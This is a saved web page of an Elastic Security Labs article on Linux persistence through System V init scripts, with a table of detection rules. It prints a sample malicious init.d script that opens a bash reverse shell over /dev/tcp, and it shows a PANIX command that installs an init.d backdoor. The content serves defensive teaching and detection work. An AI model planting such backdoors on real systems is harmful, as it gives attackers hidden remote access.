<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>Linux Detection Engineering - A Sequel on Persistence Mechanisms — Elastic Security Labs</title><meta name="description" content="In this final part of this Linux persistence series, we&#x27;ll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."/><meta property="og:title" content="Linux Detection Engineering - A Sequel on Persistence Mechanisms — Elastic Security Labs"/><meta property="og:description" content="In this final part of this Linux persistence series, we&#x27;ll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/sequel-on-persistence-mechanisms/sequel-on-persistence-mechanisms.jpg?6dc03f5deb4b1af5a1585ca4179a449f"/><meta property="og:image:alt" content="In this final part of this Linux persistence series, we&#x27;ll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Linux Detection Engineering - A Sequel on Persistence Mechanisms — Elastic Security Labs"/><meta name="twitter:description" content="In this final part of this Linux persistence series, we&#x27;ll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/sequel-on-persistence-mechanisms/sequel-on-persistence-mechanisms.jpg?6dc03f5deb4b1af5a1585ca4179a449f"/><meta name="twitter:image:alt" content="In this final part of this Linux persistence series, we&#x27;ll continue exploring persistence mechanisms on Linux systems, focusing on more advanced techniques and how to detect them."/><link rel="canonical" href="https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-791da5e634930df4.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-3d74e9a05863bcfd.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/dGrrQfBbQkqaleQ_11aBK/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/sequel-on-persistence-mechanisms"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2024-08-30T00:00:00.000Z">30 August 2024</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/ruben-groenewoud">Ruben Groenewoud</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>Linux Detection Engineering -&nbsp; A Sequel on Persistence&nbsp;Mechanisms</span></h1><p class="text-zinc-200 text-base md:text-xl">A walkthrough on how threat actors establish persistence on Linux systems and how to hunt for these techniques.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>48 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/detection-science">Detection science</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="Linux Detection Engineering - A Sequel on Persistence Mechanisms" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Fsequel-on-persistence-mechanisms%2Fsequel-on-persistence-mechanisms.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h2 class="font-bold text-2xl md:text-4xl relative"><span id="introduction" class="absolute -top-32"></span>Introduction</h2>
<p>In this third part of the <a href="https://search.elastic.co/?q=Linux%20Detection%20Engineering&amp;location%5B0%5D=Security%20Labs&amp;author%5B0%5D=Ruben%20Groenewoud">Linux Detection Engineering series</a>, we’ll dive deeper into the world of Linux persistence. We start with common or straightforward methods and move towards more complex or obscure techniques. The goal remains the same: to educate defenders and security researchers on the foundational aspects of Linux persistence by examining both trivial and more complicated methods, understanding how these methods work, how to hunt for them, and how to develop effective detection strategies.</p>
<p>In the previous article - &quot;Linux Detection Engineering - a primer on persistence mechanisms&quot; - we explored the foundational aspects of Linux persistence techniques. If you missed it, you can find it <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">here</a>.</p>
<p>We&#x27;ll set up the persistence mechanisms, analyze the logs, and observe the potential detection opportunities. To aid in this process, we’re sharing <a href="https://github.com/Aegrah/PANIX">PANIX</a>, a Linux persistence tool that Ruben Groenewoud of Elastic Security developed. PANIX simplifies and customizes persistence setup to test potential detection opportunities.</p>
<p>By the end of this series, you&#x27;ll have gained a comprehensive understanding of each of the persistence mechanisms that we covered, including:</p>
<ul>
<li>How it works (theory)</li>
<li>How to set it up (practice)</li>
<li>How to detect it (SIEM and Endpoint rules)</li>
<li>How to hunt for it (ES|QL and OSQuery reference hunts)</li>
</ul>
<p>Let’s go beyond the basics and dig a little bit deeper into the world of Linux persistence, it’s fun!</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="setup-note" class="absolute -top-32"></span>Setup note</h2>
<p>To ensure you are prepared to detect the persistence mechanisms discussed in this article, it is important to <a href="https://www.elastic.co/guide/en/security/current/prebuilt-rules-management.html#update-prebuilt-rules">enable and update our pre-built detection rules</a>. If you are working with a custom-built ruleset and do not use all of our pre-built rules, this is a great opportunity to test them and potentially fill in any gaps. Now, we are ready to get started.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="t1037---boot-or-logon-initialization-scripts-init" class="absolute -top-32"></span>T1037 - boot or logon initialization scripts: Init</h2>
<p>Init, short for &quot;initialization,&quot; is the first process started by the kernel during the boot process on Unix-like operating systems. It continues running until the system is shut down. The primary role of an init system is to start, stop, and manage system processes and services.</p>
<p>There are three major init implementations - <a href="https://man7.org/linux/man-pages/man1/systemd.1.html">Systemd</a>, <a href="https://linux.die.net/man/8/service">System V</a>, and <a href="https://linux.die.net/man/7/upstart">Upstart</a>. In <a href="https://www.elastic.co/security-labs/primer-on-persistence-mechanisms">part 1</a> of this series, we focused on Systemd. In this part, we will explore System V and Upstart. MITRE does not have specific categories for System V or Upstart. These are generally part of <a href="https://attack.mitre.org/techniques/T1037/">T1037</a>.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="t1037---boot-or-logon-initialization-scripts-system-v-init" class="absolute -top-32"></span>T1037 - boot or logon initialization scripts: System V init</h3>
<p><a href="https://linux.die.net/man/8/service">System V (SysV) init</a> is one of the oldest and most traditional init systems. SysV init scripts are gradually being replaced by modern init systems like Systemd. However, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-sysv-generator</code> allows Systemd to handle traditional SysV init scripts, ensuring older services and applications can still be managed within the newer framework.</p>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/</code> directory is a key component of the SysV init system. It is responsible for controlling the startup, running, and shutdown of services on a system. Scripts in this directory are executed at different run levels to manage various system services. Despite the rise of Systemd as the default init system in many modern Linux distributions, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init.d</code> scripts are still widely used and supported, making them a viable option for persistence.</p>
<p>The scripts in <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init.d</code> are used to start, stop, and manage services. These scripts are executed with root privileges, providing a powerful means for both administrators and attackers to ensure certain commands or services run on boot. These scripts are often linked to <a href="https://linux.die.net/man/7/runlevel">runlevel</a> directories like <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc0.d/</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc1.d/</code>, etc., which determine when the scripts are run. Runlevels, ranging from 0 to 6, define specific operational states, each configuring different services and processes to manage system behavior and user interactions. Runlevels vary depending on the distribution, but generally look like the following:</p>
<ul>
<li>0: Shutdown</li>
<li>1: Single User Mode</li>
<li>2: Multiuser mode without networking</li>
<li>3: Multiuser mode with networking</li>
<li>4: Unused</li>
<li>5: Multiuser mode with networking and GUI</li>
<li>6: Reboot</li>
</ul>
<p>During system startup, scripts are executed based on the current runlevel configuration. Each script must follow a specific structure, including <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">start</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">stop</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">restart</code>, and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">status</code> commands to manage the associated service. Scripts prefixed with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">S</code> (start) or <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">K</code> (kill) dictate actions during startup or shutdown, respectively, ordered by their numerical sequence.</p>
<p>An <a href="https://github.com/Aegrah/PANIX/blob/main/panix.sh#L1864-L1881">example</a> of a malicious <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">init.d</code> script might look similar to the following:</p>
<pre><code>#! /bin/sh
### BEGIN INIT INFO
# Provides:             malicious-sysv-script
# Required-Start:       $remote_fs $syslog
# Required-Stop:        $remote_fs $syslog
# Default-Start:        2 3 4 5
# Default-Stop:         0 1 6
### END INIT INFO

case &quot;$1&quot; in
  start)
    echo &quot;Starting malicious-sysv-script&quot;
    nohup setsid bash -c &#x27;bash -i &gt;&amp; /dev/tcp/$ip/$port 0&gt;&amp;1&#x27;
    ;;
esac</code></pre>
<p>The script must be placed in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/</code> directory and be granted execution permissions. Similarly to Systemd services, SysV scripts must also be enabled. A common utility to manage SysV configurations is <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-rc.d</code>. It allows administrators to enable or disable services and manage the symbolic links (start and kill scripts) in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/rc*.d/</code> directories, automatically setting the correct runlevels based on the configuration of the script.</p>
<pre><code>sudo update-rc.d malicious-sysv-script defaults</code></pre>
<p>The <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">malicious-sysv-script</code> is now enabled and ready to run on boot. MITRE specifies more information and real-world examples related to this technique in <a href="https://attack.mitre.org/techniques/T1037/">T1037</a>.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="persistence-through-t1037---system-v-init" class="absolute -top-32"></span>Persistence through T1037 - System V init</h4>
<p>You can manually set up a test script within the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/</code> directory, grant it execution permissions, enable it, and reboot it, or simply use <a href="https://github.com/aegrah/PANIX">PANIX</a>. PANIX is a Linux persistence tool that simplifies and customizes persistence setup for testing your detections. We can use it to establish persistence simply by running:</p>
<pre><code>&gt; sudo ./panix.sh --initd --default --ip 192.168.1.1 --port 2006
&gt; [+] init.d backdoor established with IP 192.168.1.1 and port 2006.</code></pre>
<p>Prior to rebooting and actually establishing persistence, we can see the following documents being generated in Discover:</p>
<p></p>
<p>After executing PANIX, it generates a SysV init script named <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/etc/init.d/ssh-procps</code>, applies executable permissions using <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">chmod +x</code>, and utilizes <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">update-rc.d</code>. This command triggers <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemctl daemon-reload</code>, which, in turn, activates the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">systemd-sysv-generator</code> to enable <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">ssh-procps</code> during system boot.</p>
<p>Let’s reboot the system and look at the events that are generated on shutdown/boot.</p>
<p></p>
<p>As the SysV init system is loaded early, the start command is not logged. Since it is impossible to detect an event before events are being ingested, we need to be creative in detecting this technique. Elastic will capture <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">already_running</code> event actions for service initialization events. Through this chain we are capable of detecting the execution of the service, followed by the reverse shell that was initiated. We have several detection opportunities for this persistence technique.</p>
<div class="table-container"><table style="width:100%;table-layout:fixed;word-wrap:break-word"><thead><tr><th>Category</th><th>Coverage</th></tr></thead><tbody><tr><td>File</td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_init_d_file_creation.toml">System V Init Script Created</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml">Suspicious File Creation in /etc for Persistence</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml">Potential Persistence via File Modification</a></td></tr><tr><td>Process</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_executed_binary_from_unusual_location.toml">System V Init (init.d) Executed Binary from Unusual Location</a></td></tr><tr><td></td><td><a href="https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_potential_persistence_script_executable_bit_set.toml">Executable Bit Set for Potential Persistence Script</a></td></tr><tr><td>Network</td><td><a href="https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_system_v_init_(init.d)_egress_network_connection.toml">System V Init (init.d) Egress Network Connection</a></td></tr></tbody></table></div>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="hunting-for-t1037---system-v-init" class="absolute -top-32"></span>Hunting for T1037 - System V init</h4>
